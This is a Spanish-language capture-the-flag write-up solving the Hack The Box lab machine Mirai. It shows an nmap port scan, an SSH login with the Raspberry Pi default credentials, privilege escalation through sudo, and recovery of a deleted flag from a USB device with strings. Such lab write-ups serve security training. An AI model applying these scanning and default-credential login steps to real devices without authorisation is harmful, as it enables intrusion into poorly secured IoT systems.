# WriteUp de la máquina Mirai (Hack The Box)

## Reconocimiento inicial

### Verificación de la conexión
Comenzamos comprobando si podemos comunicarnos con la máquina objetivo mediante **ping**:

```
➜  Escritorio ping -c 1 10.10.10.48                                                                                                         
PING 10.10.10.48 (10.10.10.48) 56(84) bytes of data.
64 bytes from 10.10.10.48: icmp_seq=1 ttl=63 time=39.5 ms

--- 10.10.10.48 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 39.518/39.518/39.518/0.000 ms
```

El valor `ttl=63` nos indica que la máquina objetivo está ejecutando un sistema operativo basado en Linux. Este valor es característico de sistemas Linux debido a cómo manejan los paquetes ICMP.

### Escaneo de puertos
Procedemos con un escaneo completo de todos los puertos TCP para identificar los servicios activos en la máquina. Usamos `nmap` con parámetros avanzados para maximizar la velocidad y obtener resultados detallados:

```
➜  Escritorio sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.48 -oG allports
```

#### Resultado del escaneo:
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-17 06:03 CET
Initiating SYN Stealth Scan at 06:03
Scanning 10.10.10.48 [65535 ports]
Discovered open port 53/tcp on 10.10.10.48
Discovered open port 22/tcp on 10.10.10.48
Discovered open port 80/tcp on 10.10.10.48
Discovered open port 1240/tcp on 10.10.10.48
Discovered open port 32400/tcp on 10.10.10.48
Discovered open port 32469/tcp on 10.10.10.48
Completed SYN Stealth Scan at 06:04, 11.74s elapsed (65535 total ports)
Nmap scan report for 10.10.10.48
Host is up, received user-set (0.042s latency).
Scanned at 2025-01-17 06:03:56 CET for 12s
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE   REASON
22/tcp    open  ssh       syn-ack ttl 63
53/tcp    open  domain    syn-ack ttl 63
80/tcp    open  http      syn-ack ttl 63
1240/tcp  open  instantia syn-ack ttl 63
32400/tcp open  plex      syn-ack ttl 63
32469/tcp open  unknown   syn-ack ttl 63
```

Se identifican varios puertos abiertos, siendo el **puerto 22 (SSH)** especialmente relevante, ya que podría permitirnos acceder al sistema directamente.

## Explotación inicial

### Acceso SSH
Una búsqueda rápida en Google revela que los sistemas **Raspberry Pi** utilizan un usuario y contraseña predeterminados por defecto:
- Usuario: `pi`
- Contraseña: `raspberry`

Probamos estas credenciales para conectarnos mediante SSH:

```
➜  Escritorio ssh pi@10.10.10.48
The authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.
ED25519 key fingerprint is SHA256:TL7joF/Kz3rDLVFgQ1qkyXTnVQBTYrV44Y2oXyjOa60.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.48' (ED25519) to the list of known hosts.
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.
```

Logramos acceso exitoso con las credenciales predeterminadas. Es importante destacar que este es un riesgo común en sistemas no configurados adecuadamente.

### Verificación de privilegios
Una vez dentro, verificamos los grupos a los que pertenece el usuario `pi`:

```
pi@raspberrypi:~$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)
```

El usuario pertenece al grupo **sudo**, lo que permite ejecutar comandos con privilegios de administrador. Escalamos privilegios fácilmente con:

```
pi@raspberrypi:~$ sudo su
root@raspberrypi:/home/pi# whoami
root
```

Esto nos da acceso completo como superusuario.

## Búsqueda de flags

### Flag de usuario
Exploramos el directorio del usuario `pi` y encontramos la flag de usuario:

```
root@raspberrypi:/home/pi/Desktop# ls
Plex  user.txt
```

Obtenemos el contenido de `user.txt` para completar esta parte del desafío.

### Flag de root
En el directorio raíz, identificamos un archivo `root.txt`:

```
root@raspberrypi:~# ls
root.txt
root@raspberrypi:~# cat *
I lost my original root.txt! I think I may have a backup on my USB stick...
```

El mensaje sugiere que la flag está en un dispositivo USB conectado al sistema.

### Análisis del dispositivo USB
Usamos `df -h` para listar los sistemas de archivos montados y encontramos un dispositivo USB en `/media/usbstick`:

```
root@raspberrypi:/# df -h
Filesystem      Size  Used Avail Use% Mounted on
aufs            8.5G  2.8G  5.3G  34% /
/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
```

Dentro del USB encontramos el archivo `damnit.txt`:

```
root@raspberrypi:/media/usbstick# cat damnit.txt
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

Para recuperar los datos eliminados, utilizamos `strings` para inspeccionar el contenido del dispositivo USB:

```
root@raspberrypi:/# strings /dev/sdb
...
root.txt
3***483143ff12ec505d026fa1******
```

Recuperamos con éxito la flag de root desde el dispositivo USB.

## Conclusión
Hemos obtenido ambas flags, lo que completa la resolución de la máquina **Mirai**. Este writeup resalta la importancia de:

1. Cambiar las credenciales predeterminadas en sistemas IoT como Raspberry Pi.
2. Implementar configuraciones de seguridad adecuadas para minimizar riesgos.

Una máquina interesante para reforzar conceptos básicos de ciberseguridad.
